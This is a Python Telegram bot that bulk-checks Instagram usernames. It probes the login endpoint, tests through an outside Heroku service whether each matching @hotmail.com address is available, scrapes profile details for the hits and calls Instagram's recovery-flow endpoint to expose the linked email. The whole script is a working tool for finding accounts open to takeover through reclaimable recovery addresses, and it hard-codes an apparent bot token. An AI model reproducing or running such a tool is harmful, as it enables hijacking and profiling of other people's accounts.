import telebot
from telebot import types
import requests,os
from requests import post
from concurrent.futures import ThreadPoolExecutor
import requests
from secrets import token_hex
import uuid
from user_agent import generate_user_agent
from requests import post
from requests import get
import random , hashlib , time
from os import system,name
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
import requests
from hashlib import md5
from time import time
import os
import random	
import time
from AegosPy import *
sta=True
#-------------------------------------------------#
def oo(email):
	url='https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
	haha={
		'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
		'X-Pigeon-Rawclienttime':'1707104597.347',
		'X-IG-Connection-Speed':'-1kbps',
		'X-IG-Bandwidth-Speed-KBPS':'-1.000',
		'X-IG-Bandwidth-TotalBytes-B':'0',
		'X-IG-Bandwidth-TotalTime-MS':'0',
		'X-IG-VP9-Capable':'false',
		'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
		'X-IG-Connection-Type':'WIFI',
		'X-IG-Capabilities':'3brTvw==',
		'X-IG-App-ID':'567067343352427',
		'User-Agent':'Instagram 100.0.0.17.129 Android (30/11; 320dpi; 720x1448; realme; RMX3231; RMX3231; RMX3231; ar_IQ; 161478664)',
		'Accept-Language':'ar-IQ, en-US',
		'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
		'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
		'Accept-Encoding':'gzip, deflate',
		'Host':'i.instagram.com',
		'X-FB-HTTP-Engine':'Liger',
		'Connection':'keep-alive',
		'Content-Length':'364',
		}
	ada={
		'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{email}''"}',
		'ig_sig_key_version':'4'
		}
	s=requests.post(url,headers=haha,data=ada).json()
	try:
		return s['email']
	except:
		return s
#-------------------------------------------------#
def info(email,chat_id):	
	if "@" in email:
		email=email.split("@")[0]
	username=email
	info=get('https://anonyig.com/api/ig/userInfoByUsername/'+username).json()
	bio=info['result']['user']['biography']
	name=info['result']['user']['full_name']
	prv=info['result']['user']['is_private']
	fow=info['result']['user']['follower_count']
	fwi=info['result']['user']['following_count']
	posts=info['result']['user']['media_count']
	id=info['result']['user']['pk']
	rest=oo(email)
	date = get('https://alany-2-41663a9bd041.herokuapp.com/',params={'id':id}).json()['date']
	iinfoo=(f"Name : {name}\nBio : {bio}\nemail:{username}@hotmail.com\nFollowers : {fow}\nFollowing : {fwi}\nPosts : {posts}\nIs private : {prv}\nId : {id}\nRest : {rest}\nDate : {date}")
	
	
	bot.send_message(chat_id,f"{iinfoo}")
#-------------------------------------------------#
good=0
bad=0
bot = telebot.TeleBot('7170075043:AAFCuv3HA0jbOvJGv70IxWjfE-Hg7pE02iw')
user_step = {}
#-------------------------------------------------#
def hotmail(email):
	if "@" in email:
		email=email.split('@')[0]
	email=f"{email}@hotmail.com"
	req=requests.get(f"https://api-chk-hotmail-and-outlook-dbf8b3128391.herokuapp.com/check_email/email={email}").json()
	if 'success' in req['status']:
		return 'good'
	else:
		return 'bad'
def insta(email):
	def chk(email):
	  ma = requests.Session()
	  g = str(''.join(random.choice('qwertyuiopasdfghjklzxcvbnm') for i in range(8)))
	  password = f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{g}"
	  s3 = ma.get('https://www.instagram.com/accounts/login/')
	  rs3 = ma.get('https://www.instagram.com/accounts/login/')
	  ctk = rs3.text.replace("\\", "").split('csrf_token\":\"')[1].split('"')[0]
	  headers = {
	              "user-agent":generate_user_agent(),
	              "x-csrftoken": ctk,
	              "x-ig-www-claim": "0",
	          }
	  rs3 = ma.post("https://www.instagram.com/api/v1/web/accounts/login/ajax/",headers=headers,data={"enc_password": password,"username": email,"queryParams": "{}","optIntoOneTap": "false","trustedDeviceRecords": "{}"})
	
	  headers.update({"x-ig-set-www-claim":"0"})
	  headers.update({"x-csrftoken": ctk})
	  return  (rs3.text)
	return chk(email)
#-------------------------------------------------#
def chkhh(email):
	def chkhotmail(email):
		req=hotmail(email)
		if 'good' in req:
			return 'good'
		else:
			return 'bad'
	
	def chkinsta(email):
		req=insta(email)
		if "html" in req:
			return chkhotmail(email)
		else:
			return 'bad'
	return chkinsta(email)
#-------------------------------------------------#
@bot.message_handler(commands=['start'])
def start(message):
	markup = types.InlineKeyboardMarkup()
	start_button = types.InlineKeyboardButton("- Start checking", callback_data='start_fishing')
	developer_button = types.InlineKeyboardButton("- Programmer", url='t.me/te9egram')
	status_button=types.InlineKeyboardButton("- Status", callback_data='status_fishing')
	markup.add(start_button, status_button)
	markup.add(developer_button)
	bot.send_message(message.chat.id, "- Welcome to The Bot \n- Choose one of the buttons :", reply_markup=markup)
#-------------------------------------------------#
@bot.callback_query_handler(func=lambda call: call.data == 'status_fishing')
def status_fishing_callback(call):
	global good,bad
	if sta:
		bot.send_message(call.message.chat.id,"- Start To Use It")
	else:
		bot.send_message(call.message.chat.id,f"- Good : {good}\n- Bad : {bad}")
#-------------------------------------------------#
@bot.callback_query_handler(func=lambda call: call.data == 'start_fishing')
def start_fishing_callback(call):
	global sta
	if sta:
		user_step[call.message.chat.id] = 'waiting_for_file'
		bot.send_message(call.message.chat.id, "- Send The File .")
	else:
		bot.send_message(call.message.chat.id, "- It is not possible to check two files at the same time !")
#-------------------------------------------------#
@bot.message_handler(func=lambda message: user_step.get(message.chat.id) == 'waiting_for_file', content_types=['document'])
def handle_document(message):
	global good , bad , sta
	file_name = message.document.file_name
	file_id = message.document.file_id
	file_info = bot.get_file(file_id)
	downloaded_file = bot.download_file(file_info.file_path)
	with open(file_name, 'wb') as new_file:
		new_file.write(downloaded_file)
	bot.reply_to(message, "- The check has been started .")
	user_step[message.chat.id] = None  
	file = open(file_name, "r")
	file = file.read().strip().split('\n')
	num_threads = 15  
	sta=False
	with ThreadPoolExecutor(max_workers=num_threads) as executor:
		for guii in file:
			try:
				email=f"{guii}@hotmail.com"
				executor.submit(check_account,email , message.chat.id)
			except:
				pass

			
	print(f"- Done Check file .\n- Good : {good}\n- Bad : {bad}")
	bot.send_message(message.chat.id,f"- Done Check file .\n- Good : {good}\n- Bad : {bad}")
	os.remove(file_name)
	good=0
	bad=0
	sta=True
#-------------------------------------------------#
def check_account(email, chat_id):
	global good , bad
	oo = chkhh(email)
	if "good" in oo:
		good+=1
		try:
			info(email,chat_id)
		except Exception as e:
			print(e)
	else:
		bad += 1
#-------------------------------------------------#
bot.polling()
#-------------------------------------------------#
